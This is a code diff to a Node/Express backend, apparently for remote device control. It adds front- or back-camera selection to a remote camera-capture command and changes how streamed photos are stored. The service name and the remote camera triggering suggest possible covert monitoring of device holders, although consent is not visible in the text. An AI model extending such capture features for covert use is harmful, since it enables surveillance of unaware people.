@@ -371,13 +371,19 @@ app.post("/api/command/:deviceId", async (req, res) => {
         ? "silentsync-backend.onrender.com"
         : req.headers.host;
       const streamUrl = `${protocol}://${host}/camera-stream?deviceId=${deviceId}`;
-      commandData.payload = { streamUrl };
+      const cameraType = payload?.camera || "back";
+      commandData.payload = { streamUrl, camera: cameraType };
       console.log(`[Command] Camera capture payload:`, commandData.payload);
       console.log(
-        `[Command] Camera capture requested for ${deviceId}, streamUrl: ${streamUrl}`,
+        `[Command] Camera capture requested for ${deviceId} (${cameraType} camera), streamUrl: ${streamUrl}`,
       );
       await commandRef.set(commandData);
-      return res.json({ success: true, streamUrl, commandId: commandRef.id });
+      return res.json({
+        success: true,
+        streamUrl,
+        commandId: commandRef.id,
+        camera: cameraType,
+      });
     }
 
     // Include message if provided (for display_message command)
@@ -607,7 +613,10 @@ app.post("/api/upload-photo/:deviceId", async (req, res) => {
     fs.writeFileSync(filePath, buffer);
 
     const publicUrl = `/uploads/${localFileName}`;
-    const photoId = localFileName.replace(/\./g, "_");
+    const isStreamLatest = localFileName === "camera_stream_latest.jpg";
+    const photoId = isStreamLatest
+      ? "camera_stream_latest"
+      : localFileName.replace(/\./g, "_");
 
     await db
       .collection("devices")
@@ -619,6 +628,7 @@ app.post("/api/upload-photo/:deviceId", async (req, res) => {
           fileName: localFileName,
           url: publicUrl,
           syncedAt: admin.firestore.FieldValue.serverTimestamp(),
+          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
         },
         { merge: true },
       );
